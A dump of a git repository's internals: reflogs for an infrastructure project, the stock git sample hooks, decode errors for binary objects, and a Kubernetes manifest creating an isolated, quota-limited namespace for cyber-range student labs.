+0b05aee70312d5713746c768bd70ccdff759f5:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd0 in position 18: invalid continuation byte
+```
+
+00748db978143fa69759bd6a2f90da38651d17:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xa5 in position 2: invalid start byte
+```
+
+775873c08a396e2d376f18cd6bc997a672e046:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x9d in position 2: invalid start byte
+```
+
+f607db6fb510bcf2da35898d98c724168c849a:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xa5 in position 2: invalid start byte
+```
+
+296581092be5029d002cb6d6e1782b43f6d5e5:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xcb in position 4: invalid continuation byte
+```
+
+0e8467ba610204c125aabf9c8c35ed69b1cd35:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xab in position 6: invalid start byte
+```
+
+6823e3601bf15662721fb3c63a94f27b5e59ed:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xd0 in position 18: invalid continuation byte
+```
+
+355aefcda19ec7503d4bfa701abc0c74073cd7:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb5 in position 2: invalid start byte
+```
+
+a32aeba668b1ced0424735a5017e0cd4c4b9e7:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte
+```
+
+547d960fb1c9257241e76d5366480233efa4d2:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc8 in position 18: invalid continuation byte
+```
+
+1320fbdfcbde814c2f8c952ecb2a47a8cd55ff:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb5 in position 2: invalid start byte
+```
+
+0c964e11d77c4cae2319488035630d4495295a:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb0 in position 7: invalid start byte
+```
+
+291d35b2c3bd9ceb56019b8ad8fe0941fc02a9:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc8 in position 18: invalid continuation byte
+```
+
+15f6b273b72044cc5fd8affe657a247fde04ef:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xca in position 3: invalid continuation byte
+```
+
+7c897eb560ad244e3d574450951566cfc9400f:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xb3 in position 8: invalid start byte
+```
+
+18f7a2bf9010cee69f0f687b608833f0759d5a:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xce in position 18: invalid continuation byte
+```
+
+62c7fd65ebca07f7ba134a9f67b4f179bb8bb6:
+```
+Error reading file: 'utf-8' codec can't decode byte 0x85 in position 15: invalid start byte
+```
+
+exclude:
+```
+# git ls-files --others --exclude-from=.git/info/exclude
+# Lines that start with '#' are comments.
+# For a project mostly in C, the following would be a good set of
+# exclude patterns (uncomment them if you want to use them):
+# *.[oa]
+# *~
+
+```
+
+HEAD:
+```
+0000000000000000000000000000000000000000 82355aefcda19ec7503d4bfa701abc0c74073cd7 Даниил Прокопенко <zikkyrat@MacBook-Air-Daniil.local> 1759860444 +0300	commit (initial): Initial commit with new code
+82355aefcda19ec7503d4bfa701abc0c74073cd7 4bdedf3300527f3f1fd2c2efa32ec4f5f325e6d7 Даниил Прокопенко <zikkyrat@Mac.(none)> 1759913102 +0300	pull: Fast-forward
+4bdedf3300527f3f1fd2c2efa32ec4f5f325e6d7 2b1320fbdfcbde814c2f8c952ecb2a47a8cd55ff Даниил Прокопенко <zikkyrat@MacBook-Air-Daniil.local> 1760010135 +0300	commit: fix resources for vm
+2b1320fbdfcbde814c2f8c952ecb2a47a8cd55ff 96f2fd95d8b31ef40f7a947a59317d4876893cb6 Даниил Прокопенко <zikkyrat@MacBook-Air-Daniil.local> 1760034686 +0300	commit: fix
+96f2fd95d8b31ef40f7a947a59317d4876893cb6 6690af4113ca56c693d3cbeeabfc756c46054906 Даниил Прокопенко <zikkyrat@MacBook-Air-Daniil.local> 1761142386 +0300	commit: fix vlan
+6690af4113ca56c693d3cbeeabfc756c46054906 7e3ddfc24066a27014cb103b87ea10fd0039f022 Даниил Прокопенко <prokopenko.danilka121@gmail.com> 1761234741 +0300	commit: add socket for terraform VM and fix docs
+
+```
+
+main:
+```
+0000000000000000000000000000000000000000 82355aefcda19ec7503d4bfa701abc0c74073cd7 Даниил Прокопенко <zikkyrat@MacBook-Air-Daniil.local> 1759860444 +0300	commit (initial): Initial commit with new code
+82355aefcda19ec7503d4bfa701abc0c74073cd7 4bdedf3300527f3f1fd2c2efa32ec4f5f325e6d7 Даниил Прокопенко <zikkyrat@Mac.(none)> 1759913102 +0300	pull: Fast-forward
+4bdedf3300527f3f1fd2c2efa32ec4f5f325e6d7 2b1320fbdfcbde814c2f8c952ecb2a47a8cd55ff Даниил Прокопенко <zikkyrat@MacBook-Air-Daniil.local> 1760010135 +0300	commit: fix resources for vm
+2b1320fbdfcbde814c2f8c952ecb2a47a8cd55ff 96f2fd95d8b31ef40f7a947a59317d4876893cb6 Даниил Прокопенко <zikkyrat@MacBook-Air-Daniil.local> 1760034686 +0300	commit: fix
+96f2fd95d8b31ef40f7a947a59317d4876893cb6 6690af4113ca56c693d3cbeeabfc756c46054906 Даниил Прокопенко <zikkyrat@MacBook-Air-Daniil.local> 1761142386 +0300	commit: fix vlan
+6690af4113ca56c693d3cbeeabfc756c46054906 7e3ddfc24066a27014cb103b87ea10fd0039f022 Даниил Прокопенко <prokopenko.danilka121@gmail.com> 1761234741 +0300	commit: add socket for terraform VM and fix docs
+
+```
+
+main:
+```
+0000000000000000000000000000000000000000 82355aefcda19ec7503d4bfa701abc0c74073cd7 Даниил Прокопенко <zikkyrat@MacBook-Air-Daniil.local> 1759860476 +0300	update by push
+82355aefcda19ec7503d4bfa701abc0c74073cd7 4bdedf3300527f3f1fd2c2efa32ec4f5f325e6d7 Даниил Прокопенко <zikkyrat@Mac.(none)> 1759913102 +0300	pull: fast-forward
+4bdedf3300527f3f1fd2c2efa32ec4f5f325e6d7 2b1320fbdfcbde814c2f8c952ecb2a47a8cd55ff Даниил Прокопенко <zikkyrat@MacBook-Air-Daniil.local> 1760010145 +0300	update by push
+2b1320fbdfcbde814c2f8c952ecb2a47a8cd55ff 96f2fd95d8b31ef40f7a947a59317d4876893cb6 Даниил Прокопенко <zikkyrat@MacBook-Air-Daniil.local> 1760034706 +0300	update by push
+96f2fd95d8b31ef40f7a947a59317d4876893cb6 6690af4113ca56c693d3cbeeabfc756c46054906 Даниил Прокопенко <zikkyrat@MacBook-Air-Daniil.local> 1761142399 +0300	update by push
+6690af4113ca56c693d3cbeeabfc756c46054906 7e3ddfc24066a27014cb103b87ea10fd0039f022 Даниил Прокопенко <prokopenko.danilka121@gmail.com> 1761234782 +0300	update by push
+
+```
+
+commit-msg.sample:
+```
+#!/bin/sh
+#
+# An example hook script to check the commit log message.
+# Called by "git commit" with one argument, the name of the file
+# that has the commit message.  The hook should exit with non-zero
+# status after issuing an appropriate message if it wants to stop the
+# commit.  The hook is allowed to edit the commit message file.
+#
+# To enable this hook, rename this file to "commit-msg".
+
+# Uncomment the below to add a Signed-off-by line to the message.
+# Doing this in a hook is a bad idea in general, but the prepare-commit-msg
+# hook is more suited to it.
+#
+# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
+# grep -qs "^$SOB" "$1" || echo "$SOB" >> "$1"
+
+# This example catches duplicate Signed-off-by lines.
+
+test "" = "$(grep '^Signed-off-by: ' "$1" |
+	 sort | uniq -c | sed -e '/^[ 	]*1[ 	]/d')" || {
+	echo >&2 Duplicate Signed-off-by lines.
+	exit 1
+}
+
+```
+
+pre-rebase.sample:
+```
+#!/bin/sh
+#
+# Copyright (c) 2006, 2008 Junio C Hamano
+#
+# The "pre-rebase" hook is run just before "git rebase" starts doing
+# its job, and can prevent the command from running by exiting with
+# non-zero status.
+#
+# The hook is called with the following parameters:
+#
+# $1 -- the upstream the series was forked from.
+# $2 -- the branch being rebased (or empty when rebasing the current branch).
+#
+# This sample shows how to prevent topic branches that are already
+# merged to 'next' branch from getting rebased, because allowing it
+# would result in rebasing already published history.
+
+publish=next
+basebranch="$1"
+if test "$#" = 2
+then
+	topic="refs/heads/$2"
+else
+	topic=`git symbolic-ref HEAD` ||
+	exit 0 ;# we do not interrupt rebasing detached HEAD
+fi
+
+case "$topic" in
+refs/heads/??/*)
+	;;
+*)
+	exit 0 ;# we do not interrupt others.
+	;;
+esac
+
+# Now we are dealing with a topic branch being rebased
+# on top of master.  Is it OK to rebase it?
+
+# Does the topic really exist?
+git show-ref -q "$topic" || {
+	echo >&2 "No such branch $topic"
+	exit 1
+}
+
+# Is topic fully merged to master?
+not_in_master=`git rev-list --pretty=oneline ^master "$topic"`
+if test -z "$not_in_master"
+then
+	echo >&2 "$topic is fully merged to master; better remove it."
+	exit 1 ;# we could allow it, but there is no point.
+fi
+
+# Is topic ever merged to next?  If so you should not be rebasing it.
+only_next_1=`git rev-list ^master "^$topic" ${publish} | sort`
+only_next_2=`git rev-list ^master           ${publish} | sort`
+if test "$only_next_1" = "$only_next_2"
+then
+	not_in_topic=`git rev-list "^$topic" master`
+	if test -z "$not_in_topic"
+	then
+		echo >&2 "$topic is already up to date with master"
+		exit 1 ;# we could allow it, but there is no point.
+	else
+		exit 0
+	fi
+else
+	not_in_next=`git rev-list --pretty=oneline ^${publish} "$topic"`
+	/usr/bin/perl -e '
+		my $topic = $ARGV[0];
+		my $msg = "* $topic has commits already merged to public branch:\n";
+		my (%not_in_next) = map {
+			/^([0-9a-f]+) /;
+			($1 => 1);
+		} split(/\n/, $ARGV[1]);
+		for my $elem (map {
+				/^([0-9a-f]+) (.*)$/;
+				[$1 => $2];
+			} split(/\n/, $ARGV[2])) {
+			if (!exists $not_in_next{$elem->[0]}) {
+				if ($msg) {
+					print STDERR $msg;
+					undef $msg;
+				}
+				print STDERR " $elem->[1]\n";
+			}
+		}
+	' "$topic" "$not_in_next" "$not_in_master"
+	exit 1
+fi
+
+<<\DOC_END
+
+This sample hook safeguards topic branches that have been
+published from being rewound.
+
+The workflow assumed here is:
+
+ * Once a topic branch forks from "master", "master" is never
+   merged into it again (either directly or indirectly).
+
+ * Once a topic branch is fully cooked and merged into "master",
+   it is deleted.  If you need to build on top of it to correct
+   earlier mistakes, a new topic branch is created by forking at
+   the tip of the "master".  This is not strictly necessary, but
+   it makes it easier to keep your history simple.
+
+ * Whenever you need to test or publish your changes to topic
+   branches, merge them into "next" branch.
+
+The script, being an example, hardcodes the publish branch name
+to be "next", but it is trivial to make it configurable via
+$GIT_DIR/config mechanism.
+
+With this workflow, you would want to know:
+
+(1) ... if a topic branch has ever been merged to "next".  Young
+    topic branches can have stupid mistakes you would rather
+    clean up before publishing, and things that have not been
+    merged into other branches can be easily rebased without
+    affecting other people.  But once it is published, you would
+    not want to rewind it.
+
+(2) ... if a topic branch has been fully merged to "master".
+    Then you can delete it.  More importantly, you should not
+    build on top of it -- other people may already want to
+    change things related to the topic as patches against your
+    "master", so if you need further changes, it is better to
+    fork the topic (perhaps with the same name) afresh from the
+    tip of "master".
+
+Let's look at this example:
+
+		   o---o---o---o---o---o---o---o---o---o "next"
+		  /       /           /           /
+		 /   a---a---b A     /           /
+		/   /               /           /
+	       /   /   c---c---c---c B         /
+	      /   /   /             \         /
+	     /   /   /   b---b C     \       /
+	    /   /   /   /             \     /
+    ---o---o---o---o---o---o---o---o---o---o---o "master"
+
+
+A, B and C are topic branches.
+
+ * A has one fix since it was merged up to "next".
+
+ * B has finished.  It has been fully merged up to "master" and "next",
+   and is ready to be deleted.
+
+ * C has not merged to "next" at all.
+
+We would want to allow C to be rebased, refuse A, and encourage
+B to be deleted.
+
+To compute (1):
+
+	git rev-list ^master ^topic next
+	git rev-list ^master        next
+
+	if these match, topic has not merged in next at all.
+
+To compute (2):
+
+	git rev-list master..topic
+
+	if this is empty, it is fully merged to "master".
+
+DOC_END
+
+```
+
+pre-commit.sample:
+```
+#!/bin/sh
+#
+# An example hook script to verify what is about to be committed.
+# Called by "git commit" with no arguments.  The hook should
+# exit with non-zero status after issuing an appropriate message if
+# it wants to stop the commit.
+#
+# To enable this hook, rename this file to "pre-commit".
+
+if git rev-parse --verify HEAD >/dev/null 2>&1
+then
+	against=HEAD
+else
+	# Initial commit: diff against an empty tree object
+	against=$(git hash-object -t tree /dev/null)
+fi
+
+# If you want to allow non-ASCII filenames set this variable to true.
+allownonascii=$(git config --type=bool hooks.allownonascii)
+
+# Redirect output to stderr.
+exec 1>&2
+
+# Cross platform projects tend to avoid non-ASCII filenames; prevent
+# them from being added to the repository. We exploit the fact that the
+# printable range starts at the space character and ends with tilde.
+if [ "$allownonascii" != "true" ] &&
+	# Note that the use of brackets around a tr range is ok here, (it's
+	# even required, for portability to Solaris 10's /usr/bin/tr), since
+	# the square bracket bytes happen to fall in the designated range.
+	test $(git diff --cached --name-only --diff-filter=A -z $against |
+	  LC_ALL=C tr -d '[ -~]\0' | wc -c) != 0
+then
+	cat <<\EOF
+Error: Attempt to add a non-ASCII file name.
+
+This can cause problems if you want to work with people on other platforms.
+
+To be portable it is advisable to rename the file.
+
+If you know what you are doing you can disable this check using:
+
+  git config hooks.allownonascii true
+EOF
+	exit 1
+fi
+
+# If there are whitespace errors, print the offending file names and fail.
+exec git diff-index --check --cached $against --
+
+```
+
+applypatch-msg.sample:
+```
+#!/bin/sh
+#
+# An example hook script to check the commit log message taken by
+# applypatch from an e-mail message.
+#
+# The hook should exit with non-zero status after issuing an
+# appropriate message if it wants to stop the commit.  The hook is
+# allowed to edit the commit message file.
+#
+# To enable this hook, rename this file to "applypatch-msg".
+
+. git-sh-setup
+commitmsg="$(git rev-parse --git-path hooks/commit-msg)"
+test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
+:
+
+```
+
+fsmonitor-watchman.sample:
+```
+#!/usr/bin/perl
+
+use strict;
+use warnings;
+use IPC::Open2;
+
+# An example hook script to integrate Watchman
+# (https://facebook.github.io/watchman/) with git to speed up detecting
+# new and modified files.
+#
+# The hook is passed a version (currently 2) and last update token
+# formatted as a string and outputs to stdout a new update token and
+# all files that have been modified since the update token. Paths must
+# be relative to the root of the working tree and separated by a single NUL.
+#
+# To enable this hook, rename this file to "query-watchman" and set
+# 'git config core.fsmonitor .git/hooks/query-watchman'
+#
+my ($version, $last_update_token) = @ARGV;
+
+# Uncomment for debugging
+# print STDERR "$0 $version $last_update_token\n";
+
+# Check the hook interface version
+if ($version ne 2) {
+	die "Unsupported query-fsmonitor hook version '$version'.\n" .
+	    "Falling back to scanning...\n";
+}
+
+my $git_work_tree = get_working_dir();
+
+my $retry = 1;
+
+my $json_pkg;
+eval {
+	require JSON::XS;
+	$json_pkg = "JSON::XS";
+	1;
+} or do {
+	require JSON::PP;
+	$json_pkg = "JSON::PP";
+};
+
+launch_watchman();
+
+sub launch_watchman {
+	my $o = watchman_query();
+	if (is_work_tree_watched($o)) {
+		output_result($o->{clock}, @{$o->{files}});
+	}
+}
+
+sub output_result {
+	my ($clockid, @files) = @_;
+
+	# Uncomment for debugging watchman output
+	# open (my $fh, ">", ".git/watchman-output.out");
+	# binmode $fh, ":utf8";
+	# print $fh "$clockid\n@files\n";
+	# close $fh;
+
+	binmode STDOUT, ":utf8";
+	print $clockid;
+	print "\0";
+	local $, = "\0";
+	print @files;
+}
+
+sub watchman_clock {
+	my $response = qx/watchman clock "$git_work_tree"/;
+	die "Failed to get clock id on '$git_work_tree'.\n" .
+		"Falling back to scanning...\n" if $? != 0;
+
+	return $json_pkg->new->utf8->decode($response);
+}
+
+sub watchman_query {
+	my $pid = open2(\*CHLD_OUT, \*CHLD_IN, 'watchman -j --no-pretty')
+	or die "open2() failed: $!\n" .
+	"Falling back to scanning...\n";
+
+	# In the query expression below we're asking for names of files that
+	# changed since $last_update_token but not from the .git folder.
+	#
+	# To accomplish this, we're using the "since" generator to use the
+	# recency index to select candidate nodes and "fields" to limit the
+	# output to file names only. Then we're using the "expression" term to
+	# further constrain the results.
+	my $last_update_line = "";
+	if (substr($last_update_token, 0, 1) eq "c") {
+		$last_update_token = "\"$last_update_token\"";
+		$last_update_line = qq[\n"since": $last_update_token,];
+	}
+	my $query = <<"	END";
+		["query", "$git_work_tree", {$last_update_line
+			"fields": ["name"],
+			"expression": ["not", ["dirname", ".git"]]
+		}]
+	END
+
+	# Uncomment for debugging the watchman query
+	# open (my $fh, ">", ".git/watchman-query.json");
+	# print $fh $query;
+	# close $fh;
+
+	print CHLD_IN $query;
+	close CHLD_IN;
+	my $response = do {local $/; <CHLD_OUT>};
+
+	# Uncomment for debugging the watch response
+	# open ($fh, ">", ".git/watchman-response.json");
+	# print $fh $response;
+	# close $fh;
+
+	die "Watchman: command returned no output.\n" .
+	"Falling back to scanning...\n" if $response eq "";
+	die "Watchman: command returned invalid output: $response\n" .
+	"Falling back to scanning...\n" unless $response =~ /^\{/;
+
+	return $json_pkg->new->utf8->decode($response);
+}
+
+sub is_work_tree_watched {
+	my ($output) = @_;
+	my $error = $output->{error};
+	if ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {
+		$retry--;
+		my $response = qx/watchman watch "$git_work_tree"/;
+		die "Failed to make watchman watch '$git_work_tree'.\n" .
+		    "Falling back to scanning...\n" if $? != 0;
+		$output = $json_pkg->new->utf8->decode($response);
+		$error = $output->{error};
+		die "Watchman: $error.\n" .
+		"Falling back to scanning...\n" if $error;
+
+		# Uncomment for debugging watchman output
+		# open (my $fh, ">", ".git/watchman-output.out");
+		# close $fh;
+
+		# Watchman will always return all files on the first query so
+		# return the fast "everything is dirty" flag to git and do the
+		# Watchman query just to get it over with now so we won't pay
+		# the cost in git to look up each individual file.
+		my $o = watchman_clock();
+		$error = $output->{error};
+
+		die "Watchman: $error.\n" .
+		"Falling back to scanning...\n" if $error;
+
+		output_result($o->{clock}, ("/"));
+		$last_update_token = $o->{clock};
+
+		eval { launch_watchman() };
+		return 0;
+	}
+
+	die "Watchman: $error.\n" .
+	"Falling back to scanning...\n" if $error;
+
+	return 1;
+}
+
+sub get_working_dir {
+	my $working_dir;
+	if ($^O =~ 'msys' || $^O =~ 'cygwin') {
+		$working_dir = Win32::GetCwd();
+		$working_dir =~ tr/\\/\//;
+	} else {
+		require Cwd;
+		$working_dir = Cwd::cwd();
+	}
+
+	return $working_dir;
+}
+
+```
+
+pre-receive.sample:
+```
+#!/bin/sh
+#
+# An example hook script to make use of push options.
+# The example simply echoes all push options that start with 'echoback='
+# and rejects all pushes when the "reject" push option is used.
+#
+# To enable this hook, rename this file to "pre-receive".
+
+if test -n "$GIT_PUSH_OPTION_COUNT"
+then
+	i=0
+	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
+	do
+		eval "value=\$GIT_PUSH_OPTION_$i"
+		case "$value" in
+		echoback=*)
+			echo "echo from the pre-receive-hook: ${value#*=}" >&2
+			;;
+		reject)
+			exit 1
+		esac
+		i=$((i + 1))
+	done
+fi
+
+```
+
+prepare-commit-msg.sample:
+```
+#!/bin/sh
+#
+# An example hook script to prepare the commit log message.
+# Called by "git commit" with the name of the file that has the
+# commit message, followed by the description of the commit
+# message's source.  The hook's purpose is to edit the commit
+# message file.  If the hook fails with a non-zero status,
+# the commit is aborted.
+#
+# To enable this hook, rename this file to "prepare-commit-msg".
+
+# This hook includes three examples. The first one removes the
+# "# Please enter the commit message..." help message.
+#
+# The second includes the output of "git diff --name-status -r"
+# into the message, just before the "git status" output.  It is
+# commented because it doesn't cope with --amend or with squashed
+# commits.
+#
+# The third example adds a Signed-off-by line to the message, that can
+# still be edited.  This is rarely a good idea.
+
+COMMIT_MSG_FILE=$1
+COMMIT_SOURCE=$2
+SHA1=$3
+
+/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' "$COMMIT_MSG_FILE"
+
+# case "$COMMIT_SOURCE,$SHA1" in
+#  ,|template,)
+#    /usr/bin/perl -i.bak -pe '
+#       print "\n" . `git diff --cached --name-status -r`
+# 	 if /^#/ && $first++ == 0' "$COMMIT_MSG_FILE" ;;
+#  *) ;;
+# esac
+
+# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
+# git interpret-trailers --in-place --trailer "$SOB" "$COMMIT_MSG_FILE"
+# if test -z "$COMMIT_SOURCE"
+# then
+#   /usr/bin/perl -i.bak -pe 'print "\n" if !$first_line++' "$COMMIT_MSG_FILE"
+# fi
+
+```
+
+post-update.sample:
+```
+#!/bin/sh
+#
+# An example hook script to prepare a packed repository for use over
+# dumb transports.
+#
+# To enable this hook, rename this file to "post-update".
+
+exec git update-server-info
+
+```
+
+pre-merge-commit.sample:
+```
+#!/bin/sh
+#
+# An example hook script to verify what is about to be committed.
+# Called by "git merge" with no arguments.  The hook should
+# exit with non-zero status after issuing an appropriate message to
+# stderr if it wants to stop the merge commit.
+#
+# To enable this hook, rename this file to "pre-merge-commit".
+
+. git-sh-setup
+test -x "$GIT_DIR/hooks/pre-commit" &&
+        exec "$GIT_DIR/hooks/pre-commit"
+:
+
+```
+
+pre-applypatch.sample:
+```
+#!/bin/sh
+#
+# An example hook script to verify what is about to be committed
+# by applypatch from an e-mail message.
+#
+# The hook should exit with non-zero status after issuing an
+# appropriate message if it wants to stop the commit.
+#
+# To enable this hook, rename this file to "pre-applypatch".
+
+. git-sh-setup
+precommit="$(git rev-parse --git-path hooks/pre-commit)"
+test -x "$precommit" && exec "$precommit" ${1+"$@"}
+:
+
+```
+
+pre-push.sample:
+```
+#!/bin/sh
+
+# An example hook script to verify what is about to be pushed.  Called by "git
+# push" after it has checked the remote status, but before anything has been
+# pushed.  If this script exits with a non-zero status nothing will be pushed.
+#
+# This hook is called with the following parameters:
+#
+# $1 -- Name of the remote to which the push is being done
+# $2 -- URL to which the push is being done
+#
+# If pushing without using a named remote those arguments will be equal.
+#
+# Information about the commits which are being pushed is supplied as lines to
+# the standard input in the form:
+#
+#   <local ref> <local oid> <remote ref> <remote oid>
+#
+# This sample shows how to prevent push of commits where the log message starts
+# with "WIP" (work in progress).
+
+remote="$1"
+url="$2"
+
+zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')
+
+while read local_ref local_oid remote_ref remote_oid
+do
+	if test "$local_oid" = "$zero"
+	then
+		# Handle delete
+		:
+	else
+		if test "$remote_oid" = "$zero"
+		then
+			# New branch, examine all commits
+			range="$local_oid"
+		else
+			# Update to existing branch, examine new commits
+			range="$remote_oid..$local_oid"
+		fi
+
+		# Check for WIP commit
+		commit=$(git rev-list -n 1 --grep '^WIP' "$range")
+		if test -n "$commit"
+		then
+			echo >&2 "Found WIP commit in $local_ref, not pushing"
+			exit 1
+		fi
+	fi
+done
+
+exit 0
+
+```
+
+update.sample:
+```
+#!/bin/sh
+#
+# An example hook script to block unannotated tags from entering.
+# Called by "git receive-pack" with arguments: refname sha1-old sha1-new
+#
+# To enable this hook, rename this file to "update".
+#
+# Config
+# ------
+# hooks.allowunannotated
+#   This boolean sets whether unannotated tags will be allowed into the
+#   repository.  By default they won't be.
+# hooks.allowdeletetag
+#   This boolean sets whether deleting tags will be allowed in the
+#   repository.  By default they won't be.
+# hooks.allowmodifytag
+#   This boolean sets whether a tag may be modified after creation. By default
+#   it won't be.
+# hooks.allowdeletebranch
+#   This boolean sets whether deleting branches will be allowed in the
+#   repository.  By default they won't be.
+# hooks.denycreatebranch
+#   This boolean sets whether remotely creating branches will be denied
+#   in the repository.  By default this is allowed.
+#
+
+# --- Command line
+refname="$1"
+oldrev="$2"
+newrev="$3"
+
+# --- Safety check
+if [ -z "$GIT_DIR" ]; then
+	echo "Don't run this script from the command line." >&2
+	echo " (if you want, you could supply GIT_DIR then run" >&2
+	echo "  $0 <ref> <oldrev> <newrev>)" >&2
+	exit 1
+fi
+
+if [ -z "$refname" -o -z "$oldrev" -o -z "$newrev" ]; then
+	echo "usage: $0 <ref> <oldrev> <newrev>" >&2
+	exit 1
+fi
+
+# --- Config
+allowunannotated=$(git config --type=bool hooks.allowunannotated)
+allowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)
+denycreatebranch=$(git config --type=bool hooks.denycreatebranch)
+allowdeletetag=$(git config --type=bool hooks.allowdeletetag)
+allowmodifytag=$(git config --type=bool hooks.allowmodifytag)
+
+# check for no description
+projectdesc=$(sed -e '1q' "$GIT_DIR/description")
+case "$projectdesc" in
+"Unnamed repository"* | "")
+	echo "*** Project description file hasn't been set" >&2
+	exit 1
+	;;
+esac
+
+# --- Check types
+# if $newrev is 0000...0000, it's a commit to delete a ref.
+zero=$(git hash-object --stdin </dev/null | tr '[0-9a-f]' '0')
+if [ "$newrev" = "$zero" ]; then
+	newrev_type=delete
+else
+	newrev_type=$(git cat-file -t $newrev)
+fi
+
+case "$refname","$newrev_type" in
+	refs/tags/*,commit)
+		# un-annotated tag
+		short_refname=${refname##refs/tags/}
+		if [ "$allowunannotated" != "true" ]; then
+			echo "*** The un-annotated tag, $short_refname, is not allowed in this repository" >&2
+			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
+			exit 1
+		fi
+		;;
+	refs/tags/*,delete)
+		# delete tag
+		if [ "$allowdeletetag" != "true" ]; then
+			echo "*** Deleting a tag is not allowed in this repository" >&2
+			exit 1
+		fi
+		;;
+	refs/tags/*,tag)
+		# annotated tag
+		if [ "$allowmodifytag" != "true" ] && git rev-parse $refname > /dev/null 2>&1
+		then
+			echo "*** Tag '$refname' already exists." >&2
+			echo "*** Modifying a tag is not allowed in this repository." >&2
+			exit 1
+		fi
+		;;
+	refs/heads/*,commit)
+		# branch
+		if [ "$oldrev" = "$zero" -a "$denycreatebranch" = "true" ]; then
+			echo "*** Creating a branch is not allowed in this repository" >&2
+			exit 1
+		fi
+		;;
+	refs/heads/*,delete)
+		# delete branch
+		if [ "$allowdeletebranch" != "true" ]; then
+			echo "*** Deleting a branch is not allowed in this repository" >&2
+			exit 1
+		fi
+		;;
+	refs/remotes/*,commit)
+		# tracking branch
+		;;
+	refs/remotes/*,delete)
+		# delete tracking branch
+		if [ "$allowdeletebranch" != "true" ]; then
+			echo "*** Deleting a tracking branch is not allowed in this repository" >&2
+			exit 1
+		fi
+		;;
+	*)
+		# Anything else (is there anything else?)
+		echo "*** Update hook: unknown type of update to ref $refname of type $newrev_type" >&2
+		exit 1
+		;;
+esac
+
+# --- Finished
+exit 0
+
+```
+
+push-to-checkout.sample:
+```
+#!/bin/sh
+
+# An example hook script to update a checked-out tree on a git push.
+#
+# This hook is invoked by git-receive-pack(1) when it reacts to git
+# push and updates reference(s) in its repository, and when the push
+# tries to update the branch that is currently checked out and the
+# receive.denyCurrentBranch configuration variable is set to
+# updateInstead.
+#
+# By default, such a push is refused if the working tree and the index
+# of the remote repository has any difference from the currently
+# checked out commit; when both the working tree and the index match
+# the current commit, they are updated to match the newly pushed tip
+# of the branch. This hook is to be used to override the default
+# behaviour; however the code below reimplements the default behaviour
+# as a starting point for convenient modification.
+#
+# The hook receives the commit with which the tip of the current
+# branch is going to be updated:
+commit=$1
+
+# It can exit with a non-zero status to refuse the push (when it does
+# so, it must not modify the index or the working tree).
+die () {
+	echo >&2 "$*"
+	exit 1
+}
+
+# Or it can make any necessary changes to the working tree and to the
+# index to bring them to the desired state when the tip of the current
+# branch is updated to the new commit, and exit with a zero status.
+#
+# For example, the hook can simply run git read-tree -u -m HEAD "$1"
+# in order to emulate git fetch that is run in the reverse direction
+# with git push, as the two-tree form of git read-tree -u -m is
+# essentially the same as git switch or git checkout that switches
+# branches while keeping the local changes in the working tree that do
+# not interfere with the difference between the branches.
+
+# The below is a more-or-less exact translation to shell of the C code
+# for the default behaviour for git's push-to-checkout hook defined in
+# the push_to_deploy() function in builtin/receive-pack.c.
+#
+# Note that the hook will be executed from the repository directory,
+# not from the working tree, so if you want to perform operations on
+# the working tree, you will have to adapt your code accordingly, e.g.
+# by adding "cd .." or using relative paths.
+
+if ! git update-index -q --ignore-submodules --refresh
+then
+	die "Up-to-date check failed"
+fi
+
+if ! git diff-files --quiet --ignore-submodules --
+then
+	die "Working directory has unstaged changes"
+fi
+
+# This is a rough translation of:
+#
+#   head_has_history() ? "HEAD" : EMPTY_TREE_SHA1_HEX
+if git cat-file -e HEAD 2>/dev/null
+then
+	head=HEAD
+else
+	head=$(git hash-object -t tree --stdin </dev/null)
+fi
+
+if ! git diff-index --quiet --cached --ignore-submodules $head --
+then
+	die "Working directory has staged changes"
+fi
+
+if ! git read-tree -u -m "$commit"
+then
+	die "Could not update working tree to new HEAD"
+fi
+
+```
+
+main:
+```
+7e3ddfc24066a27014cb103b87ea10fd0039f022
+
+```
+
+main:
+```
+7e3ddfc24066a27014cb103b87ea10fd0039f022
+
+```
+
+.DS_Store:
+```
+Error reading file: 'utf-8' codec can't decode bytes in position 579-580: invalid continuation byte
+```
+
+instructors.yml:
+```
+
+```
+
+monitoring.yml:
+```
+
+```
+
+students.yml:
+```
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: students
+  labels:
+    name: students
+    purpose: cyber-range-labs
+---
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: student-isolation
+  namespace: students
+spec:
+  podSelector: {}
+  policyTypes:
+  - Ingress
+  - Egress
+  egress:
+  - to: []
+    ports:
+    - protocol: TCP
+      port: 53
+    - protocol: UDP
+      port: 53
+  - to: []
+    ports:
+    - protocol: TCP
+      port: 80
+    - protocol: TCP
+      port: 443
+  ingress:
+  - from:
+    - namespaceSelector:
+        matchLabels:
+          name: monitoring
+---
+apiVersion: v1
+kind: ResourceQuota
+metadata:
+  name: student-quota
+  namespace: students
+spec:
+  hard:
+    requests.cpu: "4"
+    requests.memory: 8Gi
+    limits.cpu: "8"
+    limits.memory: 16Gi
